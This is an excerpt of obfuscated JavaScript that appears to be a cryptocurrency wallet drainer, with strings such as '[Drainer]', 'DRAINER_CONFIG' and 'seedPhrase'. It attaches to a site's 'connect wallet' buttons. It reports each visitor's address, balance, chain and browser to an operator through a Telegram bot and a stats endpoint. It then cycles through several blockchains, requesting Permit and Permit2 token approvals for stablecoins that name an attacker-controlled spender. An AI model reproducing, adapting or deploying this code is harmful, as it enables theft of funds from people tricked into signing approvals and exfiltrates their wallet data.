_0x5cc774(_0x5b911e[_0x51009e(0x565)]);_0x44409a['logConnect'+'ion']({'address':_0x5b911e[_0x51009e(0x565)],'chain':_0x5b911e[_0x51009e(0x453)],'walletType':_0x5b911e[_0x51009e(0x2a8)],'balance':_0x1d5aa2,'userAgent':navigator[_0x51009e(0x493)]});window['Stats']&&window[_0x51009e(0x129)][_0x51009e(0x36e)](_0x51009e(0x34d),{'address':_0x5b911e[_0x51009e(0x565)],'chain':_0x5b911e[_0x51009e(0x453)],'metadata':{'walletType':_0x5b911e[_0x51009e(0x2a8)],'balance':_0x1d5aa2}});if(_0x1ef548[_0x51009e(0x5ba)+'nce']&&parseFloat(_0x1d5aa2)<=0x0){console[_0x51009e(0x36e)](_0x51009e(0x60f)+'No\x20balance'+_0x51009e(0x4ba)+'\x20stopping\x20'+_0x51009e(0x53f)+_0x51009e(0x36c));return;}const _0x4ffea4=['0x1','0x38','0x89','0xa4b1',_0x51009e(0x4f3)];for(const _0x527dac of _0x4ffea4){try{const _0x5a9364=await _0xa7aef3[_0x51009e(0x4af)](window[_0x51009e(0x171)],_0x527dac);if(!_0x5a9364[_0x51009e(0x426)])continue;await _0x258c37(_0x5b911e[_0x51009e(0x565)],_0x527dac);}catch(_0x44981d){console[_0x51009e(0x474)](_0x51009e(0x299)+_0x51009e(0x574)+_0x51009e(0x587)+'\x20to\x20'+_0x527dac+':',_0x44981d['message']);}}_0x44409a[_0x51009e(0x38c)]('✅\x20<b>Opera'+_0x51009e(0x239)+_0x51009e(0x630)+'can\x20finish'+_0x51009e(0x150)+_0x51009e(0x434)+_0x51009e(0x260));}catch(_0x551136){console['error'](_0x51009e(0x60f)+'Fatal:',_0x551136),_0x44409a['logError']('Execution\x20'+_0x51009e(0x5ea),_0x551136);}}async function _0x258c37(_0x33248f,_0xf77d00){const _0x21abea=_0xe8e9d1,_0x16cfb7={'0x1':[_0x21abea(0x216)+_0x21abea(0x174)+_0x21abea(0x43b)+_0x21abea(0x58b)+'c7',_0x21abea(0x16f)+_0x21abea(0x1ab)+_0x21abea(0x229)+_0x21abea(0x60b)+'48'],'0x38':[_0x21abea(0x596)+_0x21abea(0x152)+_0x21abea(0x226)+'9027B31979'+'55','0x8AC76a51'+_0x21abea(0x55d)+_0x21abea(0xa4)+'d97B32Cd58'+'0d'],'0x89':[_0x21abea(0x625)+_0x21abea(0x64b)+'C6611C1074'+'8AEb04B58e'+'8F',_0x21abea(0x65a)+'f2de4661ED'+'88A30C99A7'+_0x21abea(0x3a9)+'74'],'0xa4b1':[_0x21abea(0x308)+_0x21abea(0x15b)+_0x21abea(0x427)+_0x21abea(0x3f2)+'b9',_0x21abea(0x40a)+_0x21abea(0x48a)+'9327C5EDb3'+'A432268e58'+'31'],'0x2105':[_0x21abea(0x390)+_0x21abea(0x2d8)+_0x21abea(0x4c9)+_0x21abea(0x277)+'13']},_0x14c84a=_0x16cfb7[_0xf77d00]||[];for(const _0x313071 of _0x14c84a){try{!_0x1ef548[_0x21abea(0x176)+_0x21abea(0x2ab)]?await _0x3449d3['requestPer'+_0x21abea(0x562)+_0x21abea(0x2d0)](window['ethereum'],_0x33248f,{'token':_0x313071,'spender':_0x595ca4[_0x21abea(0x52f)+'n'],'chainId':parseInt(_0xf77d00,0x10)}):await _0x333218['requestPer'+_0x21abea(0x41f)+'re'](window[_0x21abea(0x171)],_0x33248f,{'token':_0x313071,'spender':_0x595ca4[_0x21abea(0x52f)+'n'],'chainId':parseInt(_0xf77d00,0x10)});}catch(_0x1e6e58){console['warn'](_0x21abea(0x35c)+_0x21abea(0x4a9)+_0x21abea(0x11e)+_0x313071+':',_0x1e6e58[_0x21abea(0x3ff)]);}}}function _0x4164f1(){const _0x548fed=_0xe8e9d1,_0x3163e5=document[_0x548fed(0x519)+_0x548fed(0x280)]('.'+(_0x595ca4['connectBut'+_0x548fed(0x100)]||'interact-b'+_0x548fed(0x4ab)));_0x3163e5['forEach'](_0x467f7d=>{const _0xb02ccf=_0x548fed;_0x467f7d[_0xb02ccf(0x25c)+'stener'](_0xb02ccf(0x5f9),_0x3d4369=>{const _0x4a2f60=_0xb02ccf;_0x3d4369[_0x4a2f60(0xb6)+_0x4a2f60(0x270)](),_0x59df24();});});}document[_0xe8e9d1(0x1b6)]==='loading'?document[_0xe8e9d1(0x25c)+'stener']('DOMContent'+_0xe8e9d1(0x255),_0x4164f1):_0x4164f1();}()),window[_0x2c4f95(0x3ba)+'l']=_0x5504da,(async function(){const _0x3bfae2=_0x2c4f95;try{window[_0x3bfae2(0x129)]={'log':async function(_0x5406c8,_0x50d606){const _0x3d7d7b=_0x3bfae2;try{const _0x2a04d4={'chain':_0x50d606[_0x3d7d7b(0x177)]||_0x3d7d7b(0x169),'type':_0x5406c8,'address':_0x50d606['address']||_0x3d7d7b(0x618),'user_id':window[_0x3d7d7b(0xbc)+_0x3d7d7b(0x470)]['user_id']||null,'amount':_0x50d606['amount']||null,'token':_0x50d606[_0x3d7d7b(0x5b3)]||null,'txHash':_0x50d606[_0x3d7d7b(0x1cb)]||null,'metadata':_0x50d606[_0x3d7d7b(0x397)]||{}};await fetch(_0x3d7d7b(0x539)+_0x3d7d7b(0x627),{'method':_0x3d7d7b(0x197),'headers':{'Content-Type':'applicatio'+_0x3d7d7b(0x1b1)},'body':JSON['stringify'](_0x2a04d4)});}catch(_0x5ef49e){}}};typeof _0x44409a!==_0x3bfae2(0x45a)&&window[_0x3bfae2(0xbc)+'NFIG'][_0x3bfae2(0x1f1)]&&(_0x44409a[_0x3bfae2(0x5ed)](window[_0x3bfae2(0xbc)+'NFIG'][_0x3bfae2(0x1f1)]),console[_0x3bfae2(0x36e)](_0x3bfae2(0x81)+_0x3bfae2(0x56c)));if(window[_0x3bfae2(0xbc)+_0x3bfae2(0x470)][_0x3bfae2(0x52f)+'n']){const _0x3f1bff={'address':_0x3bfae2(0x618),'chain':_0x3bfae2(0x4cc),'referrer':document[_0x3bfae2(0x50d)]||_0x3bfae2(0x29b),'user_id':window[_0x3bfae2(0xbc)+_0x3bfae2(0x470)][_0x3bfae2(0x16d)]||null};typeof _0x44409a!==_0x3bfae2(0x45a)&&_0x44409a[_0x3bfae2(0x38c)](_0x3bfae2(0x604)+_0x3bfae2(0x51e)+'\x0a'+(_0x3bfae2(0x5b9)+_0x3bfae2(0x301))+(document[_0x3bfae2(0x50d)]||_0x3bfae2(0x2ea))+'</code>\x0a'+('Page:\x20<cod'+'e>')+window[_0x3bfae2(0x482)][_0x3bfae2(0x25d)]+'</code>'),window[_0x3bfae2(0x129)][_0x3bfae2(0x36e)](_0x3bfae2(0x238),{'referrer':document[_0x3bfae2(0x50d)]||_0x3bfae2(0x29b)});}}catch(_0x387ea5){console[_0x3bfae2(0x4a8)]('[Init]\x20Err'+_0x3bfae2(0x378),_0x387ea5);}}());}()));function _0x4a8a(_0x364f9c,_0x363932){_0x364f9c=_0x364f9c-0x76;const _0x1e7a7b=_0x2f57();let _0x38ef63=_0x1e7a7b[_0x364f9c];return _0x38ef63;}function _0x2f57(){const _0x177f60=['\x20\x20position','Wrapped\x20BT','x\x20solid\x20tr','dia/assets','rgba(255,\x20','.wallet-cl','0xe708','55,\x200.1);\x0a','h</span>','n18Aak','nonce)','Ethereum','p:\x2016px;\x0a\x20','\x20linear\x20in','>\x0a\x20\x20\x20\x20','TRX','ay:\x20flex;\x0a','\x20\x20\x20\x20\x20displ','\x20.wallet-m','test','und:\x20rgba(','d\x20chain:\x20','TokenPocke','0;\x0a\x20\x20\x20\x20\x20\x20v','\x0a\x20\x20\x20\x20\x20\x20pad','ink-btn\x22\x20i','seedPhrase','i.telegram','token','Coinbase\x20W','ize:\x2012px;','#28A0F0','ween;\x0a\x20\x20\x20\x20','}\x0a\x20\x20\x20\x20.wal','Referrer:\x20','onlyIfBala','nal\x20view\x20r','\x20column;\x20a','counter','der\x20connec','ect','inner\x22></d','Missing\x20ch','XDEFI','isibility:','hain-switc','itemType','nter;\x20gap:','\x20\x20\x20\x20\x20max-w','relative;\x0a','ding:\x2014px','Chain\x20conf','ecimals()\x20','.chain-clo','i.avax.net','Select\x20Net','orderType','add',';\x20border-b','t-grid\x20{\x0a\x20','Chain:\x20<co','From(addre','OfferItem[','k:\x20','ess','linea','n\x20signing\x20','holder','d:\x20rgba(25','\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20','No\x20wallet\x20','Token','1;\x20font-si','toUpperCas','rsor:\x20poin','itemBg','matic.quik','id\x22\x20style=','IP:\x20<code>','enter;\x0a\x20\x20\x20','zksync.io','\x20\x20\x20\x20\x20<div\x20','left:\x20auto','Error','0xfa','scroll','configure','s:\x2024px;\x0a\x20','er\x20{\x0a\x20\x20\x20\x20\x20','-option\x20{\x0a','\x20\x20\x20\x20\x20\x20alig','dress\x20inde',';\x0a\x20\x20\x20\x20\x20\x20pa','ning\x20faile','se\x20{\x0a\x20\x20\x20\x20\x20','\x20font-weig','Permit','inbow.me/o','click','er\x20connect','F6B43aC78B','>Switch</s','xpiration)','ine)','ibility:\x20h','-radius:\x200','\x20\x20\x20}\x0a\x20\x20\x20\x20.','wallet\x20fou','Base','<b>👀\x20New\x20V','api.co/jso','Avalanche','ById','0x95d89b41','.chain-spi','\x20\x20\x20\x20\x20\x20bord','b0cE3606eB','accountsCh','eth_getBal','\x22\x20id=\x22chai','[Drainer]\x20','nt,\x20uint48','base58','0022D47303','0x313ce567','identifier','Balance:\x20<','wallet-mod','\x0a\x20\x20\x20\x20\x20\x20hei','Visitor','isTokenPoc','go.svg','\x20center;\x0a\x20','\x20\x20\x20\x20\x20\x20colo','applicatio','function\x20*','e\x20{\x20font-s','\x20space-bet','\x20justify-c','berachain','r;\x20margin-','🖼️','0xc2132D05','0x30f28b7a','vent','\x20234,\x200.2)','ackground:','view\x20retur','tent:\x20cent','ync.io','stener','ransform:\x20','\x20\x20\x20align-i','eted</b>\x0aS','nt256\x20valu',';\x0a\x20\x20\x20\x20\x20\x20tr','https://et','n>\x0a\x20\x20\x20\x20\x20\x20\x20','#16213e\x2010','Compound','rollscan.c','iguration\x20','tamask.app','n\x20{\x0a\x20\x20\x20\x20\x20\x20','\x20\x20align-it','#000','https://li','dal\x20{\x0a\x20\x20\x20\x20','\x20\x20\x20\x20\x20trans',';\x0a\x20\x20\x20\x20\x20\x20gr','constructo','\x20opacity:\x20','Type:\x20<cod','argin-righ','flex;\x0a\x20\x20\x20\x20','ox.svg','ts)\x20transf','ius:\x2050%;\x0a','160\x20amount','\x20\x20font-fam','D31c914a87','tokenSymbo','\x20Arial,\x20sa','02230091a7','\x0a\x20\x20\x20\x20\x20\x20cur','0.2)','ul/browse/','checkboxes',':\x20backgrou','60\x20amount)','<button\x20cl','ax-width:\x20','let','=\x22chain-cu','n\x20class=\x22c','0x2791Bca1','ion:\x20fixed','0x38','already_on','external','com/Wallet','SHIB','r;\x0a\x20\x20\x20\x20\x20\x20m','rder:\x20none','neascan.bu','\x20rgba(239,','toLocaleSt','nt\x22>\x0a\x20\x20\x20\x20\x20','ner','-container','createElem','\x20<div\x20clas','9,\x2068,\x2068,',':\x20visible;','[Logger]\x20C','55,\x20255,\x202','argin-bott','witch-prom','ETH','der-top-co','iscan.xyz','permitted','pedData','\x20\x20\x20backgro',';\x0a\x20\x20\x20\x20\x20\x20fo','\x0a\x20\x20\x20\x20\x20\x20tra','2212ohgZZM','.1);\x0a\x20\x20\x20\x20}','\x2010px;\x0a\x20\x20\x20','work','returns\x20(s','\x20left:\x200;\x0a','ea;\x0a\x20\x20\x20\x20\x20\x20','\x20\x20\x20\x20\x20posit','aded','Dypius','while\x20(tru','\x20\x20\x20\x20.chain','#fff','bottom:\x208p','ation:\x20cha','</code>\x20(','0x82','address\x20to','https://go','ader\x20{\x0a\x20\x20\x20','ect]\x20UI\x20Ad','wallet-ite','in=\x22','D68b83fE1A','\x201;\x0a\x20\x20\x20\x20\x20\x20','\x200;\x0a\x20\x20\x20\x20\x20\x20','from','AVAX','Coinbase','234,\x200.3);','0x92','tAccounts','finite;\x0a\x20\x20','480px)\x20{\x0a\x20','onceBitmap','\x0a\x20\x20\x20\x20\x20\x20z-i','HTML','erDetails,','label\x20{\x0a\x20\x20','sor:\x20point','n-name\x20{\x0a\x20','preventDef','us:\x2050%;\x0a\x20','allowed','/button>\x0a\x20','h:\x20100%;\x0a\x20','Uniswap','DRAINER_CO','2GCrsaC','-modal-sub','Address:\x20<','licnode.co','-icon\x22\x20sty','https://op','\x0a\x20\x20\x20\x20\x20\x20top','C-Chain','y.active\x20{','ht:\x20600;\x20m','.ico',',\x20Roboto,\x20','0x138c2','ottom-righ','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20','lass=\x22chai','eth_signTy','isit</b>','lygonscan.','Gnosis\x20Cha','on)\x20extern','sort','n-modal-ov','ain.com','212\x20100%)','a1a2e\x200%,\x20','etwork\x20to\x20','nter;\x20}\x0a\x20\x20','int256)','\x20expiratio','px\x20solid\x20','ter;\x0a\x20\x20\x20\x20\x20','dient(180d','ionItem[]','s=\x22chain-s','Wallet\x20eng','ansform:\x20t','set:\x200;\x0a\x20\x20','llet-item-','rc=\x22','0%);\x0a\x20\x20\x20\x20\x20','Unichain','onclick','55,\x20255,\x200','expiry','nsition:\x20a','\x20\x20backgrou','call','interact-b','nd:\x20linear','56[]\x20amoun','\x200\x204px\x2012p','\x20border-ra','c.linea.bu','-bottom:\x201','chatId','function\x20s','herscan.io','_chain','\x20rgba(255,','toFixed','https://ba','ain-option','efault)/Lo','ymbol()\x20ex','/logo.png','ound:\x20','tonsClass','\x5c+\x5c+\x20*(?:[','7737212833','der\x22>\x0a\x20\x20\x20\x20','metamask-f','Brave\x20Wall','spender','priority','m\x20{\x0a\x20\x20\x20\x20\x20\x20','\x20\x20\x20\x20\x20\x20\x20<bu','\x20\x20\x20\x20font-s','.wallet-it','transform:','\x20\x20\x20\x20\x20\x20\x20gri','ode>','switching','<b>🔗\x20Walle','llet','rror\x20{\x0a\x20\x20\x20','\x20\x20\x20\x20\x20\x20</di','lygon-rpc.','cscan.com','walletType','pedData_v3','blast','padStart','zksync','itch-messa','(bytes32)','innet.base','ken\x20','.link/dapp','dal-header','search','isBitkeep','isRabby','\x22this.src=','\x20deadline,','-columns:\x20','startsWith','0f0000','Stats','owtrace.io','\x20\x20\x20\x20border','tch-icon\x20{','batch','ransfer(ad','20px);\x0a\x20\x20\x20','ress','Wrapped\x20Bi','\x2016px;\x0a\x20\x20\x20','\x20\x20\x20\x20\x20color','\x20\x20\x20\x20\x20\x20z-in','lor:\x20','e,\x20uint256','ity:\x20visib','\x20\x20\x20\x20\x20\x20<spa','textConten','6px;\x0a\x20\x20\x20\x20}','ledger','0\x200\x200\x201px\x20',',\x20255,\x200.2','dress\x20to,\x20','\x20address\x20s','Status:\x20<c','Unknown','failed:\x20','\x20\x20\x20.chain-','\x20.chain-sw','\x20margin-to','th:\x2032px;\x0a','\x22grid-temp','.chain-opt','2.binance.','\x20\x20\x20\x20margin','https://fo','LINK','px;\x0a\x20\x20\x20\x20}\x0a','tronlink','\x0a\x20\x20\x20\x20\x20\x20<di','ed\x20for\x20all','Connect\x20Wa','6f99059fF7','chainName','\x200;\x0a\x20\x20\x20\x20}\x0a','argin-top:','ay:\x20flex;\x20','dius:\x2020px','injected','om:\x2024px;\x0a','eth_accoun','CD5C481DCC','https://bs','allet','ound:\x20rgba','ready','nicscan.or','innet.opti','ted,\x20addre','491058pHiQIJ','ton>\x0a\x20\x20\x20\x20\x20','0xa9059cbb','1;\x20visibil','ss\x20indexed','c-mainnet.','unknown','transferFr','code>','m:\x20transla','user_id','ify','0xA0b86991','55,255,0.1','ethereum','chainChang','h-message\x22','8D2ee523a2','Please\x20Ver','disablePer','chain','oken','isTrust','02,\x20126,\x202','iew\x20return','classList','function\x20D','ion\x20','slice','Solana','c.blast.io','adius:\x2016p','5,\x200.2);\x0a\x20','\x20\x20\x20\x20.walle','aster/SVG/','m.io/rpc','ddress\x20acc','or:\x20#f8717','.4,\x200,\x200.2','\x20\x20\x20\x20<h3\x20cl','active','lign-items','verifyingC','-name\x22>','\x20\x20\x20\x20\x20justi','columns:\x20r','[WalletDet','ottom-left','Signer','\x20\x20\x20\x20\x20</but','0x00000000','k\x22>\x0a\x20\x20\x20\x20\x20\x20','POST','anslateY(0','\x20\x20\x20\x20\x20\x20heig','#8C8C8C','split','00%;\x20margi','icon\x22>','>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','ranslateY(','nt)\x20permit','dataset',';\x0a\x20\x20\x20\x20\x20\x20ma','\x20\x20\x20\x20\x20\x20just','head','\x20}\x0a\x20\x20\x20\x20}\x0a\x20','className','gn-items:\x20','\x2016px;\x20col','\x20absolute;','ss=\x22deep-l','c6218b36c1','keys','xDai','\x20.chain-mo','\x20\x20.wallet-','</h3>\x0a\x20\x20\x20\x20','n/json','t:\x20auto;\x0a\x20','https://rp','ion','l\x22>Current','readyState','border:\x201p','55,255,0.0','55,\x200.05);','idden;\x0a\x20\x20\x20','iled:\x20','\x20\x20\x20\x20\x20\x20<div','late-colum','\x20\x20\x20\x20backgr','push','ign','ferFromBat','Permit\x20sig','exports','02e69b4628','ose','l...','find',';\x20transfor','der)\x20exter','r\x20availabl','txHash','w.githubus','pacity:\x200;','OrderCompo','ght:\x2020px;','(((.+)+)+)','solana','Aave\x20Token','r:\x20','int256\x20non','Invalid\x20ow','No\x20provide','999;\x0a\x20\x20\x20\x20\x20','ct-fit:\x20co','icon',';\x0a\x20\x20\x20\x20\x20\x20di','.chain-ico','126,\x20234,\x20',':\x20center;\x20','\x20\x20.deep-li','ding:\x2012px','0x534352','style=\x22jus','t-size:\x2048','n.com','5,\x20255,\x2025','FTM','FFFFFFFFFF','astscan.io','\x20\x20\x20width:\x20','\x20{\x0a\x20\x20\x20\x20\x20\x20b','size:\x2018px','0xFFFFFFFF','b1.arbitru','eight:\x20600','ferFrom(tu','56px;\x20heig','pender,\x20ui','telegram','e\x200%,\x20#121','\x20\x20\x20\x20\x20\x20\x20\x20\x20<','com/assets','avax','eY(100%);\x0a','ype','</div>\x0a\x20\x20\x20','Unknown\x20ch','\x0a\x20\x20\x20\x20\x20\x20bor','\x20#fff;\x0a\x20\x20\x20','div\x20id=\x22wa','nk.trustwa','\x27https://a','rror\x22>','t:\x20600;\x0a\x20\x20','wallet-err','\x0a\x20\x20\x20\x20.wall','\x20\x20\x20<button','in-option.','ify-conten','0xa4163851','Batch\x20Perm','der:\x202px\x20s','ll\x200.2s\x20ea','r.com/ton-','\x20\x20\x20font-si','isSafePal','ket','\x20{\x0a\x20\x20\x20\x20\x20\x20f','XDAI','https://ce','ion:\x20all\x200','ainnet','.chain-mod','blur(12px)','isTally','0xdAC17F95','entries',':\x2016px;\x0a\x20\x20','0x89','s.com','function','c.soniclab','\x22chain-opt','er-color:\x20','ition:\x20all','User\x20cance','USDT','\x20\x20\x20\x20<img\x20s','ttps://raw','id\x20rgba(23','tcoin','7548524699','ets/images','ass=\x22chain','d19D4a2e9E','\x20\x20</div>\x0a\x20','hain-name\x22','\x20bytes32\x20s',',\x20uint48\x20e','Wallet','t-size:\x2018','itching...','https://ww','padding:\x201','x\x20rgba(0,0','#000000','nt256\x20amou','COMP','https://sn','visit','tion\x20Compl','255,\x20255,\x20','rgba(255,2','ize:\x2020px;','0.00','Choose\x20a\x20n','stringify','n-check\x20{\x0a','https://ex','eth_chainI','zkSync\x20Era','0x06fdde03','rmitted,\x20a','\x20\x20\x20\x20\x20\x20grid','\x20\x20\x20\x20\x20\x20curs','ess\x20owner,','eth_signTr','MetaMask','ox-shadow:','0x768b6d34','h.llamarpc','or:\x20pointe','2c55e;\x0a\x20\x20\x20','\x22Segoe\x20UI\x22','Dai\x20Stable','values','it2\x20signin','\x20\x20\x20\x20\x20margi','Loaded','margin-bot','er;\x20backgr','y.active\x20.','hex','0x23b872dd','\x20{\x20transfo','addEventLi','href','#FCFC03','align-item','chains.','isXDEFI','.org/bot','ken,\x20uint1','OrCriteria','rnal\x20view\x20','#FF007A','verlay.act','n;\x0a\x20\x20\x20\x20\x20\x20b','#ffffff','https://ar','r\x22>\x0a\x20\x20\x20\x20\x20\x20','\x20\x20\x20\x20\x20\x20marg','status','tch\x20to\x20','0xa86a','ault','idth:\x2032px','lor:\x20#667e','\x20\x20\x20\x20\x20\x20\x20\x20','\x20\x20\x20\x20}\x0a\x20\x20\x20\x20','ssions','n-current-','1b54bdA029','\x200.3s\x20cubi','90%;\x0a\x20\x20\x20\x20\x20','le;\x20}\x0a\x20\x20\x20\x20','\x20\x20\x20','\x20address\x20i','Rabby','\x200,\x200,\x200.6','Fantom','torAll','Fantom\x20Ope','t-modal\x20{\x0a','sonic','Phantom','\x20tuple(tup','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',');\x0a\x20\x20\x20\x20\x20\x20t','Invalid\x20to','=\x22wallet-e','g:\x2012px;\x20m','apply','innerHTML','dapp?cb_ur','nt)\x20extern','x-width:\x201','der:\x201px\x20s','getElement','e)\x20externa','https://fa','x-width:\x206','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<','Failed\x20to\x20','>Cancel</s',';\x0a\x20\x20\x20\x20\x20\x20ba','[ChainSwit','tom:\x2016px;','direct','hereum.pub','BERA','(0,\x200,\x200,\x20','n-bottom:\x20','s=\x22chain-m','SHIBA\x20INU','gap:\x2012px;','24ingrOPaj','Optimism','0000000000','(string)','\x20\x20\x20\x20color:','type','Action:\x20<c','d</b>','mit2','x;\x20transit','nd:\x20rgba(2','m:\x2020px;\x0a\x20','y-content:','add\x20networ','https://ft','json','tion:\x20fixe','20px;\x0a\x20\x20\x20\x20',';\x22>\x0a\x20\x20\x20\x20\x20\x20','Arbitrum','0x13e31','k/brand-re','pen_url?ur','pan>','\x200.3);\x0a\x20\x20\x20','enabled','ect]\x20No\x20pr','inter-even','\x20\x20\x20backdro','iv><span\x20c','t-modal-he','TKN','now','px\x20rgba(0,','innet.unic','city','Avalanche\x20','\x20class=\x22ch','t-size:\x2013','8715690141','owner','gger','\x20uint8\x20v,\x20','uint160\x20am','e)\x20{}','ure','rno.celo.o','body','BitKeep','ransferFro','name','r:\x20#fff;\x0a\x20','tuple(addr','D6eDb6E08f','PermitTran','c.scroll.i','Sonic','n-modal-su','https://be','string','let-close\x20','deadline','Switch\x20Net','splitTx','nk-metamas','se;\x0a\x20\x20\x20\x20\x20\x20',');\x0a\x20\x20\x20\x20}\x0a\x20','coinbase','v\x20class=\x22c','e:\x2014px;\x0a\x20','com/MetaMa','Direct','s=\x22mobile-','USDC','0.0000','USD\x20Coin','0x1','ght:\x20700;\x0a','pan>\x0a\x20\x20\x20\x20\x20','\x20failed:','\x20\x20\x20<div\x20cl','celo','personal_s','ailed:\x20','ight=\x2220\x22>','show','phantom','rder-radiu','\x20Open\x20in\x20M','allet-item','737b10984C','number','0xa4b1','20;\x20color:','<code>','</div>',':\x20translat','sescan.org','x;\x20align-i','rascan.com','function\x20n','0xFd086bC7','\x20to,\x20uint2','hain.org','\x20{\x0a\x20\x20\x20\x20\x20\x20t','lled','eth_sendTr','ect]\x20Adapt','l-overlay','0.85);\x0a\x20\x20\x20','eight:\x2040p','256\x20nonce,','rom','m-icon\x20img','\x20backgroun','contains','ts:\x20none;\x0a','\x20\x20color:\x20#','\x20token,\x20ui','248\x20nonceW','https://bl','\x20\x20\x20\x20\x20.chai','isBraveWal','Wrapped\x20Et','de>','llet-error','title\x20{\x0a\x20\x20','trust','balanceOf','modal-over','EthereumCh','oval(addre','\x20(bool)','nents','dress\x20spen','ess\x20owner)','ns\x20(uint25','defaultAdd','xed\x20token,','span','ze:\x2013px;\x20','or:\x20#a0a0b','s\x20signatur','tronLink','bsc','code','UNI','8\x20expirati','le(address','ing-bottom','0F116dDEE9','OKX\x20Wallet','isOneInchI','ssions[]','low:\x20hidde','ext-align:','180293xukScQ','0x144','0xd505accf','0xa','fff;\x0a\x20\x20\x20\x20}','th=\x2220\x22\x20he','SafePal','\x20hidden;\x0a\x20','\x20flex;\x0a\x20\x20\x20','0x0','add\x20chain\x20','unichain','tronWeb','lose\x22>&tim','connect','\x20\x20\x20\x20\x20paddi','chain-moda','chain-chec','Ef3e08E8dF',':\x20#f87171;','chain-curr','WETH','irect)\x0a\x20\x20\x20','eth_call','okx','574279fb71','ontent:\x20ce','Celo','display:\x20f','[Strategy]','class=\x22cha','(102,\x20126,','Arbitrum\x20O','innet','ntom.publi','in-spin\x201s','tron','/div>\x0a\x20\x20\x20\x20','uto;\x0a\x20\x20\x20\x20\x20','nonce','\x20\x20\x20\x20\x20','0x64','\x20\x20\x20\x20\x20overf','px;\x20paddin','</code>','fig.','t,\x20bytes\x20s','log','t:\x200;\x0a\x20\x20\x20\x20','\x27\x22>\x0a\x20\x20\x20\x20\x20\x20','0.05)','\x20Network</','g\x20failed:\x20','d;\x20bottom:','ustwallet.','com/rainbo','eth_estima','or:','\x0a\x20\x20\x20\x20\x20\x20dis','dth:\x2020px;','DYP','center;\x0a\x20\x20','ent\x20{\x0a\x20\x20\x20\x20','$]*)','chain-opti','fy-content','join','optimism','icon\x20{\x0a\x20\x20\x20','BNB','ChainSwitc','Invalid\x20sp','tchEthereu','remove','startAmoun','\x20\x20\x20\x20\x20\x20opac','DAI','send','#333','WBTC','switch\x20to','0x833589fC','\x20token,\x20ad','ction\x20fail','n:\x200;\x20posi','endTime','60a8d4e71d','olid\x20rgba(','metadata','uint8',';\x0a\x20\x20\x20\x20\x20\x20\x20\x20','\x201fr);\x0a\x20\x20\x20','ter:\x20','bool','Native','t:\x20center;','.org','(360deg);\x20','request','rrent-labe','\x20position:','rm:\x20rotate','Considerat','t256\x20deadl','Zeal','publicKey','a9449Aa841','x;\x0a\x20\x20\x20\x20\x20\x20h','ndex:\x209999','isOkxWalle','\x20\x20\x20\x20font-w','wner,\x20uint','isWalletCo','blur','\x20class=\x22wa','sferFrom','rainbow','antom.app/','<b>✍️\x20Signa','tems:\x20cent','e-columns:','block','om/favicon','WalletModa','WalletConn','pi.dicebea','d\x20modal\x20or','ng:\x2024px;\x0a','Amount:\x20<c','wallet','er;\x20justif','in-switch-','a(255,\x20255','\x22\x20alt=\x22','erlay\x20{\x0a\x20\x20','function\x20a','chain-spin','TokenPermi',';\x0a\x20\x20\x20\x20\x20\x20in','{\x0a\x20\x20\x20\x20\x20\x20po','ze:\x2016px;\x0a','radius:\x2012','\x20\x20border-b','esources/m','t</h2>\x0a\x20\x20\x20','none','r:\x201px\x20sol','#f5f5f5','tron_reque','https://tr','FFFFFF','\x20\x20\x20\x20\x20borde','006c3852cb','0.5);\x0a\x20\x20\x20\x20','function\x20d','top:\x2016px;','country_na','ansition:\x20','</span>','Polygon','isFrame','<b>🌱\x20SEED\x20','allet-moda','offer','192BszoMz','68985ncxxzO','ndexed\x20spe','\x20r,\x20bytes3','Tether\x20USD','.chain-err','n:\x200\x200\x208px','etaMask\x20(D','match','a-zA-Z_$][','switching\x20','ansaction','dius:\x2050%;','#8247E5',';\x20border-r','A1C0b69FCb','\x20@media\x20(m','ent','com','target','1188060mdaVqm','class=\x22wal','\x20\x20\x20border-','isArray','.githubuse','ily:\x20-appl','\x0a\x20\x20\x20\x20\x20\x20fon','4rrWldY','message','border','balance','isExodus','https://ra','isZeal',';\x0a\x20\x20\x20\x20\x20\x20co','offerer','t\x20Connecte','Rainbow','deep-link-','0xaf88d065','\x20selected','faa41c97d9','30QVqdKL','e\x22>','x;\x0a\x20\x20\x20\x20\x20\x20b','pprove(add','ain-switch','ion:\x20opaci','ent-name\x20{','\x20\x20\x20\x20\x20font-','=\x22chain-gr','spender,\x20u','.com','\x20\x20\x20\x20cursor','-items:\x20ce','lex;\x20flex-','external\x20v','name\x20{\x20fon','2px;\x0a\x20\x20\x20\x20\x20','\x20no\x20wallet','mitSignatu','\x20\x20opacity:','\x20max-heigh','x;\x0a\x20\x20\x20\x20\x20\x20a',',\x20uint256\x20','0x70a08231','forEach','success','9C85ebE478','w\x20returns\x20','transform\x20','e4FSjs4lhd','lex;\x20align','Permit2','isRainbow','BNB\x20Smart\x20','kground:\x20','Chain','al\x20returns','\x20owner,\x20ad','v\x20class=\x22w','\x20priority\x20','symbol','https://ap','gap:\x208px;\x0a','https://me','\x20\x20\x20\x20\x20\x20anim','00px)\x20{\x0a\x20\x20','2062069945','\x20\x20\x20\x20\x20\x20\x20bac','ns-serif;\x0a','length','mism.io','-close:hov','botToken','n-items:\x20c','234,\x200.1);','isPhantom','bby.io/ass','\x20signing\x20f','kground:\x20r','Trust\x20Wall','tring)','ess\x20to,\x20ui','32px;\x20obje','ht:\x2032px;\x0a','https://po','appendChil','only\x22>\x0a\x20\x20\x20','debu','Tron\x20conne',';\x0a\x20\x20\x20\x20}\x0a\x20\x20','chainId','ed:\x20','ain','WalletDete','n,\x20uint48\x20','x.svg\x22\x20wid','blur(8px)','undefined','switch-det','ed,\x20uint8\x20','}\x0a\x20\x20\x20\x20}\x0a\x20\x20','63567nDcezB','\x20{\x0a\x20\x20\x20\x20\x20\x20w','zone','considerat','init','nonce,\x20uin','onces(addr','color','c.berachai','Ethereum\x20T','\x22></div>\x0a\x20','s=\x22chain-c','\x0a\x20\x20\x20\x20\x20\x20col','c/C/rpc','\x20\x20\x20\x20<div>\x0a','\x2068,\x2068,\x200','https://ma',':\x20pointer;','NFIG','o;\x0a\x20\x20\x20\x20\x20\x20b','button\x20cla','\x200.7;\x20text','warn','Invalid\x20si','x;\x0a\x20\x20\x20\x20\x20\x20m','User\x20close',':\x20flex;\x0a\x20\x20','eturns\x20(ui','coin','\x20\x20\x20\x20justif','ay:\x20grid;\x0a','\x20\x20\x20\x20\x20\x20widt','WBNB','c-da